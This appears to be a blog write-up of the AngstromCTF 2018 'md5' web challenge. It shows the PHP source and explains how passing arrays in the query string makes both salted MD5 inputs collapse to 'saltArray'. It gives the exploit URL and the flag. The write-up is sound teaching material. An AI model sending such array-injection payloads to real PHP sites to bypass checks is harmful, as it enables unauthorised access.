---
layout:     post
title:      "AngstromCTF - md5"
description: "The story about why we have to check types of the input passed in PHP."
date:       2018-03-23 4:00:00
author:     "W3ndige"
permalink: /:title/
category: AngstromCTF
---

As we've finished the previous web challenge, let's jump into the next one called `md5`.

- Category: Web
- Points: 140

{% highlight text %}
defund's a true MD5 fan, and he has a site to prove it.
{% endhighlight %}

### Solution

From the start we're getting the source code of the challenge.

{% highlight php %}
<?php
  include 'secret.php';
  if($_GET["str1"] and $_GET["str2"]) {
    if ($_GET["str1"] !== $_GET["str2"] and
        hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"])) {
      echo $flag;
    } else {
      echo "Sorry, you're wrong.";
    }
    exit();
  }
?>
<!DOCTYPE html>
<html>
<body style="font-size: 18pt; margin: 10% 10% 10% 10%">
  <p>
    People say that MD5 is broken... But they're wrong! All I have to do is use a secret salt. >:)
  </p>
  <p>
    If you can find two distinct strings that—when prepended with my salt—have the same MD5 hash, I'll give you a flag. Deal?
  </p>
  <p>
    Also, here's the <a href="src">source</a>.
  </p>
  <form method="GET">
    String 1: <input type="text" name="str1" style="font-size: 18pt; margin: 10px 10px 10px 10px">
    <br>
    String 2: <input type="text" name="str2" style="font-size: 18pt; margin: 10px 10px 10px 10px">
    <br>
    <input type="submit" style="font-size: 18pt; margin: 10px 0 10px 0">
  </form>
</body>
</html>
{% endhighlight %}

What can we get from it? First condition that will make us closer to the flag is that both fields should be filled.

{% highlight php %}
if($_GET["str1"] and $_GET["str2"])
{% endhighlight %}

After that, we have to make sure that our values are different from each other.

{% highlight php %}
$_GET["str1"] !== $_GET["str2"
{% endhighlight %}

And we the hashes should be the same in order to get the flag.

{% highlight bash %}
hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"]))
{% endhighlight %}

If all condtions are met, then we will be able to get the flag. But how should be able to do it with two different characters producing the same hash? Type juggling is not an option here, as it's using the strict comparision while comparing hashes so we have to look for something else. Remebering the [Spot The Bug](https://www.securify.nl/en/blog/SFY20180101/spot-the-bug-challenge-2018-warm-up.html) challenge, where the vulnerability was in supplying the array, we can have this in mind.

First condition will be met, as the both arrays will be inputted. After that we have to place different inputs in the arrays as only then the second condition will be met. But what will happen when we concatenate string with an array just as here `$salt . $_GET["str1"]`.

{% highlight php %}
php > $salt = "test";
php > $array[] = 1;
php > $array2[] = 2;
php > echo($salt . $array);
PHP Notice:  Array to string conversion in php shell code on line 1
testArray
php > echo($salt . $array2);
PHP Notice:  Array to string conversion in php shell code on line 1
testArray
{% endhighlight %}

As you can see, we get the same results. And that's how we're going to exploit this challenge.

{% highlight html %}
http://web.angstromctf.com:3003/?str1[]=1&str2[]=2
{% endhighlight %}

Look at the url, and look at the flag.

{% highlight text %}
actf{but_md5_has_charm}
{% endhighlight %}
